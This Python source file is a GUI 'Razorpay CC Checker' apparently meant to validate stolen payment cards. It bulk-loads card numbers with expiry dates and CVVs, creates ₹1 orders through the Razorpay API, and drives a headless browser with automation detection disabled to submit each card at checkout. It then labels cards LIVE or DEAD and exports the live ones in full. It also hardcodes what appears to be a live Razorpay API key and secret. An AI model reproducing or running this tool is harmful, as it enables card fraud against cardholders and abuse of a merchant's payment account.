#!/usr/bin/env python3
"""
Razorpay CC Checker — CustomTkinter GUI
Author: AngelGuardian
GitHub: narko3188/razorpay-checker-gui
"""

import customtkinter as ctk
from tkinter import filedialog, messagebox
from PIL import Image
import threading
import queue
import asyncio
import json
import re
import time
import sys
import os
from datetime import datetime
from pathlib import Path
from concurrent.futures import ThreadPoolExecutor

import requests
from playwright.async_api import async_playwright

# ─── CONFIG ──────────────────────────────────────────────────
RAZORPAY_KEY_ID = "rzp_live_yYGWUPovOauhOx"
RAZORPAY_KEY_SECRET = "m5wQh8cIXTJ92UJeoHhwtLxa"
ORDER_AMOUNT = 100  # ₹1.00
ORDER_CURRENCY = "INR"
MAX_CONCURRENT = 3

# ─── COLORS ───────────────────────────────────────────────────
BG = "#0a0a0a"
FG = "#d4af37"
BG2 = "#1a1a1a"
BG3 = "#2a2a2a"
GREEN = "#00ff88"
RED = "#ff3344"
YELLOW = "#ffaa00"
GRAY = "#666666"
WHITE = "#cccccc"

ctk.set_appearance_mode("dark")
ctk.set_default_color_theme("dark-blue")


# ─── API HELPERS ─────────────────────────────────────────────

def create_order():
    """Create Razorpay order."""
    receipt = f"chk_{int(time.time()*1000)}"
    resp = requests.post(
        "https://api.razorpay.com/v1/orders",
        auth=(RAZORPAY_KEY_ID, RAZORPAY_KEY_SECRET),
        json={"amount": ORDER_AMOUNT, "currency": ORDER_CURRENCY, "receipt": receipt},
        timeout=15
    )
    if resp.status_code == 200:
        return resp.json()["id"]
    return None


def get_order_status(order_id):
    """Check order payment status."""
    resp = requests.get(
        f"https://api.razorpay.com/v1/orders/{order_id}",
        auth=(RAZORPAY_KEY_ID, RAZORPAY_KEY_SECRET),
        timeout=10
    )
    if resp.status_code == 200:
        data = resp.json()
        return data.get("status"), data.get("amount_paid", 0), data.get("attempts", 0)
    return None, 0, 0


# ─── BROWSER CHECKER ─────────────────────────────────────────

async def check_card_async(browser, card_data):
    """Check a single card via Razorpay Checkout."""
    card_num = card_data["number"]
    last4 = card_num[-4:]
    bin6 = card_num[:6]
    
    order_id = create_order()
    if not order_id:
        return "ORDER_FAIL", {"last4": last4, "bin": bin6, "reason": "Order creation failed"}
    
    context = await browser.new_context(
        viewport={"width": 480, "height": 750},
        user_agent="Mozilla/5.0 (Linux; Android 13; SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
        locale="en-IN",
        timezone_id="Asia/Kolkata"
    )
    page = await context.new_page()
    
    try:
        checkout_url = (
            f"https://api.razorpay.com/v1/checkout/embedded?"
            f"key_id={RAZORPAY_KEY_ID}&order_id={order_id}&amount={ORDER_AMOUNT}"
            f"&name=Test&description=Verify&prefill[contact]=9999999999"
            f"&prefill[email]=test@test.com&modal=1"
        )
        
        await page.goto(checkout_url, wait_until="domcontentloaded", timeout=20000)
        await asyncio.sleep(1.5)
        
        # Find card input frame
        card_frame = None
        for frame in page.frames:
            if "razorpay" in frame.url.lower() or "checkout" in frame.url.lower():
                card_frame = frame
                break
        
        target = card_frame or page
        
        # Fill card details
        await target.fill('input[name="card[number]"]', card_num, timeout=5000)
        await target.fill('input[name="card[name]"]', card_data.get("name", "Test User"), timeout=3000)
        exp = f"{card_data['expiry_month']:02d}/{str(card_data['expiry_year'])[-2:]}"
        await target.fill('input[name="card[expiry]"]', exp, timeout=3000)
        await target.fill('input[name="card[cvv]"]', str(card_data["cvv"]), timeout=3000)
        
        await asyncio.sleep(0.3)
        
        # Click Pay
        try:
            btn = target.locator('button:has-text("Pay"), [type="submit"], .rzp-submit')
            await btn.click(timeout=4000)
        except:
            await page.keyboard.press("Enter")
        
        await asyncio.sleep(4)
        
        # Detect result
        page_text = await page.content()
        page_url = page.url
        
        # OTP page = card is LIVE
        if any(x in page_text.lower() for x in ["enter otp", "otp", "verification code", "authenticate"]):
            await context.close()
            return "LIVE", {"last4": last4, "bin": bin6, "type": "OTP Required"}
        
        # 3DS redirect
        if "acs" in page_url.lower() or "three-ds" in page_url.lower() or "3ds" in page_url.lower():
            await context.close()
            return "LIVE", {"last4": last4, "bin": bin6, "type": "3DS Challenge"}
        
        # Success page
        if "success" in page_url.lower() or "payment_id" in page_url:
            await context.close()
            return "LIVE", {"last4": last4, "bin": bin6, "type": "Payment OK"}
        
        # Decline keywords
        decline_words = [
            "declined", "insufficient", "do not honor", "stolen", "pickup",
            "restricted", "incorrect", "not valid", "issuer declined",
            "transaction not permitted", "not completed", "card blocked"
        ]
        for kw in decline_words:
            if kw in page_text.lower():
                await context.close()
                return "DEAD", {"last4": last4, "bin": bin6, "reason": kw.title()}
        
        # Check via API
        status, amt_paid, attempts = get_order_status(order_id)
        
        if status == "paid" or amt_paid > 0:
            await context.close()
            return "LIVE", {"last4": last4, "bin": bin6, "type": f"Paid ₹{amt_paid/100}"}
        
        # attempted + attempts>0 = bank processed the card → LIVE (OTP/3DS pending)
        if status == "attempted" and attempts > 0:
            await context.close()
            return "LIVE", {"last4": last4, "bin": bin6, "type": "Attempted (Bank OK)"}
        
        # failed/cancelled = card declined
        if status in ("failed", "cancelled"):
            await context.close()
            return "DEAD", {"last4": last4, "bin": bin6, "reason": f"Status: {status}"}
        
        await context.close()
        return "UNKNOWN", {"last4": last4, "bin": bin6, "reason": f"Status: {status}"}
        
    except Exception as e:
        await context.close()
        return "ERROR", {"last4": last4, "bin": bin6, "reason": str(e)[:80]}


async def check_batch_async(cards, result_queue, progress_callback):
    """Check a batch of cards."""
    async with async_playwright() as p:
        browser = await p.chromium.launch(
            headless=True,
            args=[
                "--disable-blink-features=AutomationControlled",
                "--no-sandbox",
                "--disable-dev-shm-usage",
                "--disable-gpu"
            ]
        )
        
        total = len(cards)
        for i, card in enumerate(cards):
            status, details = await check_card_async(browser, card)
            result = (i, card, status, details)
            result_queue.put(result)
            progress_callback(i + 1, total, card, status)
        
        await browser.close()


# ─── GUI APPLICATION ─────────────────────────────────────────

class RazorpayCheckerGUI(ctk.CTk):
    def __init__(self):
        super().__init__()
        
        self.title("Razorpay CC Checker — AngelGuardian")
        self.geometry("1050x720")
        self.configure(fg_color=BG)
        
        self.cards = []
        self.results = []
        self.live_count = 0
        self.dead_count = 0
        self.error_count = 0
        self.is_running = False
        self.browser_ready = False
        
        self._build_ui()
    
    def _build_ui(self):
        # ─── HEADER ───────────────────────────────────────
        header = ctk.CTkFrame(self, fg_color=BG2, height=60, corner_radius=0)
        header.pack(fill="x", padx=0, pady=0)
        
        ctk.CTkLabel(
            header, text="💳 RAZORPAY CC CHECKER", 
            font=ctk.CTkFont(size=22, weight="bold"), 
            text_color=FG
        ).pack(side="left", padx=20, pady=10)
        
        ctk.CTkLabel(
            header, text="v1.0 | narko3188", 
            font=ctk.CTkFont(size=12), 
            text_color=GRAY
        ).pack(side="right", padx=20, pady=10)
        
        # ─── MAIN CONTENT ────────────────────────────────
        main = ctk.CTkFrame(self, fg_color="transparent")
        main.pack(fill="both", expand=True, padx=15, pady=10)
        
        # LEFT PANEL — Controls + Card Input
        left = ctk.CTkFrame(main, fg_color=BG2, width=350)
        left.pack(side="left", fill="y", padx=(0, 10))
        left.pack_propagate(False)
        
        # Key display
        key_frame = ctk.CTkFrame(left, fg_color=BG3)
        key_frame.pack(fill="x", padx=10, pady=(10, 5))
        
        ctk.CTkLabel(key_frame, text="🔑 API Key", font=ctk.CTkFont(size=13, weight="bold"),
                     text_color=FG).pack(anchor="w", padx=10, pady=(10, 2))
        
        ctk.CTkLabel(key_frame, text=f"Razorpay LIVE: {RAZORPAY_KEY_ID[:25]}...",
                     font=ctk.CTkFont(size=11, family="Consolas"),
                     text_color=GREEN).pack(anchor="w", padx=10, pady=(0, 5))
        
        ctk.CTkLabel(key_frame, text=f"Amount: ₹{ORDER_AMOUNT/100:.2f} per check",
                     font=ctk.CTkFont(size=10), text_color=GRAY).pack(anchor="w", padx=10, pady=(0, 10))
        
        # Card list area
        cards_label = ctk.CTkFrame(left, fg_color=BG3)
        cards_label.pack(fill="x", padx=10, pady=5)
        
        ctk.CTkLabel(cards_label, text="📋 CARDS", font=ctk.CTkFont(size=13, weight="bold"),
                     text_color=FG).pack(anchor="w", padx=10, pady=(10, 2))
        
        self.cards_count_label = ctk.CTkLabel(cards_label, text="0 cards loaded",
                                               font=ctk.CTkFont(size=11), text_color=GRAY)
        self.cards_count_label.pack(anchor="w", padx=10, pady=(0, 10))
        
        # Card textbox
        self.cards_text = ctk.CTkTextbox(left, height=280, fg_color=BG3,
                                          font=ctk.CTkFont(size=11, family="Consolas"),
                                          text_color=WHITE, border_color=BG3, border_width=1)
        self.cards_text.pack(fill="both", expand=True, padx=10, pady=5)
        self.cards_text.insert("1.0", "# Paste cards here\n# Format: CC|MM|YY|CVV\n# One per line\n")
        
        # Buttons
        btn_frame = ctk.CTkFrame(left, fg_color="transparent")
        btn_frame.pack(fill="x", padx=10, pady=10)
        
        self.import_btn = ctk.CTkButton(btn_frame, text="📁 Import .txt", 
                                         fg_color=BG3, hover_color="#333333",
                                         command=self.import_cards,
                                         font=ctk.CTkFont(size=12))
        self.import_btn.pack(side="left", fill="x", expand=True, padx=(0, 5))
        
        self.parse_btn = ctk.CTkButton(btn_frame, text="🔍 Parse", 
                                        fg_color=BG3, hover_color="#333333",
                                        command=self.parse_cards,
                                        font=ctk.CTkFont(size=12))
        self.parse_btn.pack(side="left", fill="x", expand=True, padx=5)
        
        # Start button
        self.start_btn = ctk.CTkButton(left, text="▶ START CHECKING", 
                                        fg_color="#d4af37", hover_color="#c49b2c",
                                        text_color="#000000",
                                        command=self.start_checking,
                                        font=ctk.CTkFont(size=14, weight="bold"),
                                        height=45)
        self.start_btn.pack(fill="x", padx=10, pady=5)
        
        self.stop_btn = ctk.CTkButton(left, text="⏹ STOP", 
                                       fg_color=RED, hover_color="#cc2233",
                                       command=self.stop_checking,
                                       font=ctk.CTkFont(size=12, weight="bold"),
                                       height=35, state="disabled")
        self.stop_btn.pack(fill="x", padx=10, pady=(0, 5))
        
        # Progress
        self.progress = ctk.CTkProgressBar(left, fg_color=BG3, progress_color=FG, height=8)
        self.progress.pack(fill="x", padx=10, pady=5)
        self.progress.set(0)
        
        self.progress_label = ctk.CTkLabel(left, text="Ready", font=ctk.CTkFont(size=10), 
                                            text_color=GRAY)
        self.progress_label.pack(padx=10, pady=(0, 10))
        
        # RIGHT PANEL — Results + Stats
        right = ctk.CTkFrame(main, fg_color=BG2)
        right.pack(side="right", fill="both", expand=True)
        
        # Stats bar
        stats = ctk.CTkFrame(right, fg_color=BG3, height=70)
        stats.pack(fill="x", padx=10, pady=(10, 5))
        stats.pack_propagate(False)
        
        stat_inner = ctk.CTkFrame(stats, fg_color="transparent")
        stat_inner.pack(expand=True, fill="both", padx=10)
        
        self.stat_total = ctk.CTkLabel(stat_inner, text="0", font=ctk.CTkFont(size=22, weight="bold"),
                                        text_color=WHITE)
        self.stat_total.pack(side="left", expand=True)
        ctk.CTkLabel(stat_inner, text="TOTAL", font=ctk.CTkFont(size=10),
                     text_color=GRAY).pack(side="left", expand=True)
        
        self.stat_live = ctk.CTkLabel(stat_inner, text="0", font=ctk.CTkFont(size=22, weight="bold"),
                                       text_color=GREEN)
        self.stat_live.pack(side="left", expand=True)
        ctk.CTkLabel(stat_inner, text="LIVE", font=ctk.CTkFont(size=10),
                     text_color=GREEN).pack(side="left", expand=True)
        
        self.stat_dead = ctk.CTkLabel(stat_inner, text="0", font=ctk.CTkFont(size=22, weight="bold"),
                                       text_color=RED)
        self.stat_dead.pack(side="left", expand=True)
        ctk.CTkLabel(stat_inner, text="DEAD", font=ctk.CTkFont(size=10),
                     text_color=RED).pack(side="left", expand=True)
        
        self.stat_error = ctk.CTkLabel(stat_inner, text="0", font=ctk.CTkFont(size=22, weight="bold"),
                                        text_color=YELLOW)
        self.stat_error.pack(side="left", expand=True)
        ctk.CTkLabel(stat_inner, text="ERROR", font=ctk.CTkFont(size=10),
                     text_color=YELLOW).pack(side="left", expand=True)
        
        # Results table area
        table_header = ctk.CTkFrame(right, fg_color=BG3)
        table_header.pack(fill="x", padx=10, pady=(5, 0))
        
        cols = [("STATUS", 8), ("BIN", 11), ("LAST4", 8), ("EXPIRY", 8), ("CVV", 5), ("DETAILS", 48)]
        for col, w in cols:
            ctk.CTkLabel(table_header, text=col, font=ctk.CTkFont(size=10, weight="bold"),
                         text_color=FG, width=w*8).pack(side="left", padx=2, pady=4)
        
        # Scrollable results
        self.results_frame = ctk.CTkScrollableFrame(right, fg_color=BG2)
        self.results_frame.pack(fill="both", expand=True, padx=10, pady=(0, 10))
        
        # Export button row
        export_frame = ctk.CTkFrame(right, fg_color="transparent")
        export_frame.pack(fill="x", padx=10, pady=(0, 10))
        
        ctk.CTkButton(export_frame, text="📄 Export LIVE", fg_color=BG3, hover_color="#333333",
                      command=self.export_live, font=ctk.CTkFont(size=11),
                      width=120).pack(side="left", padx=(0, 5))
        
        ctk.CTkButton(export_frame, text="📄 Export ALL", fg_color=BG3, hover_color="#333333",
                      command=self.export_all, font=ctk.CTkFont(size=11),
                      width=120).pack(side="left", padx=5)
        
        ctk.CTkButton(export_frame, text="🗑 Clear", fg_color=BG3, hover_color="#333333",
                      command=self.clear_results, font=ctk.CTkFont(size=11),
                      width=80).pack(side="right")
        
        # Result queue
        self.result_queue = queue.Queue()
        self._stop_event = threading.Event()
    
    def import_cards(self):
        filepath = filedialog.askopenfilename(
            title="Import Cards",
            filetypes=[("Text files", "*.txt"), ("All files", "*.*")]
        )
        if filepath:
            with open(filepath, "r", encoding="utf-8", errors="ignore") as f:
                content = f.read()
            self.cards_text.delete("1.0", "end")
            self.cards_text.insert("1.0", content)
            self.parse_cards()
    
    def parse_cards(self):
        text = self.cards_text.get("1.0", "end")
        self.cards = []
        
        for line in text.split("\n"):
            line = line.strip()
            if not line or line.startswith("#"):
                continue
            
            # Split by | / or :
            parts = re.split(r'[|/:]', line)
            if len(parts) >= 4:
                try:
                    cc = parts[0].replace(" ", "").strip()
                    mm = int(parts[1].strip())
                    yy = parts[2].strip()
                    yy = int(f"20{yy}" if len(yy) == 2 else yy)
                    cvv = parts[3].strip()
                    
                    if len(cc) >= 13 and 1 <= mm <= 12 and yy >= 2026:
                        self.cards.append({
                            "number": cc,
                            "expiry_month": mm,
                            "expiry_year": yy,
                            "cvv": cvv,
                            "name": parts[4].strip() if len(parts) >= 5 else "User"
                        })
                except:
                    pass
        
        self.cards_count_label.configure(text=f"{len(self.cards)} cards loaded | Format: CC|MM|YY|CVV")
        self.stat_total.configure(text=str(len(self.cards)))
    
    def start_checking(self):
        if self.is_running:
            return
        
        self.parse_cards()
        
        if not self.cards:
            messagebox.showwarning("No Cards", "Load or paste cards first!\nFormat: CC|MM|YY|CVV")
            return
        
        self.is_running = True
        self._stop_event.clear()
        self.results = []
        self.live_count = 0
        self.dead_count = 0
        self.error_count = 0
        
        # Clear old results
        for widget in self.results_frame.winfo_children():
            widget.destroy()
        
        self.start_btn.configure(state="disabled", text="⏳ CHECKING...")
        self.stop_btn.configure(state="normal")
        self.import_btn.configure(state="disabled")
        self.parse_btn.configure(state="disabled")
        self.progress.set(0)
        
        # Start in background thread
        thread = threading.Thread(target=self._run_checks, daemon=True)
        thread.start()
        
        # Start polling results
        self.after(100, self._poll_results)
    
    def stop_checking(self):
        self._stop_event.set()
        self.is_running = False
        self.start_btn.configure(state="normal", text="▶ START CHECKING")
        self.stop_btn.configure(state="disabled")
        self.import_btn.configure(state="normal")
        self.parse_btn.configure(state="normal")
        self.progress_label.configure(text="Stopped by user")
    
    def _run_checks(self):
        """Run in background thread."""
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        
        async def run():
            async with async_playwright() as p:
                browser = await p.chromium.launch(
                    headless=True,
                    args=[
                        "--disable-blink-features=AutomationControlled",
                        "--no-sandbox",
                        "--disable-dev-shm-usage",
                        "--disable-gpu"
                    ]
                )
                
                total = len(self.cards)
                for idx, card in enumerate(self.cards):
                    if self._stop_event.is_set():
                        break
                    
                    status, details = await check_card_async(browser, card)
                    self.result_queue.put((idx, card, status, details))
                    
                    if status == "LIVE":
                        self.live_count += 1
                    elif status == "DEAD":
                        self.dead_count += 1
                    else:
                        self.error_count += 1
                
                await browser.close()
        
        try:
            loop.run_until_complete(run())
        except Exception as e:
            self.result_queue.put(("ERROR_GLOBAL", None, "ERROR", {"reason": str(e)[:100]}))
        finally:
            loop.close()
            self.after(0, self._checking_done)
    
    def _poll_results(self):
        """Poll results from queue and update UI."""
        try:
            while True:
                idx, card, status, details = self.result_queue.get_nowait()
                self._add_result_row(card, status, details)
                
                # Update stats
                progress_pct = (idx + 1) / len(self.cards) if self.cards else 0
                self.progress.set(progress_pct)
                self.stat_total.configure(text=str(len(self.cards)))
                self.stat_live.configure(text=str(self.live_count))
                self.stat_dead.configure(text=str(self.dead_count))
                self.stat_error.configure(text=str(self.error_count))
                self.progress_label.configure(
                    text=f"{idx+1}/{len(self.cards)} | LIVE: {self.live_count} | DEAD: {self.dead_count}"
                )
                
        except queue.Empty:
            pass
        
        if self.is_running:
            self.after(200, self._poll_results)
    
    def _add_result_row(self, card, status, details):
        """Add a result row to the scrollable frame."""
        row = ctk.CTkFrame(self.results_frame, fg_color=BG3, height=28)
        row.pack(fill="x", pady=1)
        
        colors = {"LIVE": GREEN, "DEAD": RED, "ERROR": YELLOW, "ORDER_FAIL": YELLOW, "UNKNOWN": GRAY}
        emoji = {"LIVE": "🟢", "DEAD": "🔴", "ERROR": "🟡", "ORDER_FAIL": "🟡", "UNKNOWN": "⚪"}
        
        color = colors.get(status, GRAY)
        em = emoji.get(status, "⚪")
        
        bin6 = card["number"][:6]
        last4 = card["number"][-4:]
        exp = f"{card['expiry_month']:02d}/{str(card['expiry_year'])[-2:]}"
        cvv = str(card["cvv"])
        detail = details.get("reason") or details.get("type") or status
        
        ctk.CTkLabel(row, text=f"{em} {status}", font=ctk.CTkFont(size=9, weight="bold"),
                     text_color=color, width=90).pack(side="left", padx=3)
        ctk.CTkLabel(row, text=bin6, font=ctk.CTkFont(size=10, family="Consolas"),
                     text_color=WHITE, width=70).pack(side="left", padx=3)
        ctk.CTkLabel(row, text=last4, font=ctk.CTkFont(size=10, family="Consolas"),
                     text_color=WHITE, width=50).pack(side="left", padx=3)
        ctk.CTkLabel(row, text=exp, font=ctk.CTkFont(size=10),
                     text_color=WHITE, width=50).pack(side="left", padx=3)
        ctk.CTkLabel(row, text=cvv, font=ctk.CTkFont(size=10, family="Consolas"),
                     text_color=GRAY, width=35).pack(side="left", padx=3)
        ctk.CTkLabel(row, text=str(detail)[:55], font=ctk.CTkFont(size=9),
                     text_color=GRAY).pack(side="left", padx=3, fill="x", expand=True)
    
    def _checking_done(self):
        self.is_running = False
        self.start_btn.configure(state="normal", text="▶ START CHECKING")
        self.stop_btn.configure(state="disabled")
        self.import_btn.configure(state="normal")
        self.parse_btn.configure(state="normal")
        self.progress.set(1.0)
        self.progress_label.configure(
            text=f"✓ DONE | LIVE: {self.live_count} | DEAD: {self.dead_count} | ERROR: {self.error_count}"
        )
    
    def export_live(self):
        if not self.results:
            return
        
        live_cards = [(c, s, d) for c, s, d in self.results if s == "LIVE"]
        if not live_cards:
            messagebox.showinfo("Export", "No live cards found.")
            return
        
        filepath = filedialog.asksaveasfilename(
            title="Export LIVE Cards",
            defaultextension=".txt",
            filetypes=[("Text files", "*.txt")]
        )
        if filepath:
            with open(filepath, "w") as f:
                for card, status, details in live_cards:
                    f.write(f"{card['number']}|{card['expiry_month']:02d}|"
                           f"{str(card['expiry_year'])[-2:]}|{card['cvv']}|{details.get('type','')}\n")
            messagebox.showinfo("Export", f"Exported {len(live_cards)} LIVE cards to:\n{filepath}")
    
    def export_all(self):
        if not self.results:
            return
        
        filepath = filedialog.asksaveasfilename(
            title="Export All Results",
            defaultextension=".txt",
            filetypes=[("Text files", "*.txt")]
        )
        if filepath:
            with open(filepath, "w") as f:
                for card, status, details in self.results:
                    f.write(f"{status}|{card['number']}|{card['expiry_month']:02d}|"
                           f"{str(card['expiry_year'])[-2:]}|{card['cvv']}|{details.get('reason',details.get('type',''))}\n")
            messagebox.showinfo("Export", f"Exported {len(self.results)} results to:\n{filepath}")
    
    def clear_results(self):
        for widget in self.results_frame.winfo_children():
            widget.destroy()
        self.results = []
        self.live_count = 0
        self.dead_count = 0
        self.error_count = 0
        self.stat_live.configure(text="0")
        self.stat_dead.configure(text="0")
        self.stat_error.configure(text="0")
        self.progress.set(0)
        self.progress_label.configure(text="Cleared")


if __name__ == "__main__":
    app = RazorpayCheckerGUI()
    app.mainloop()
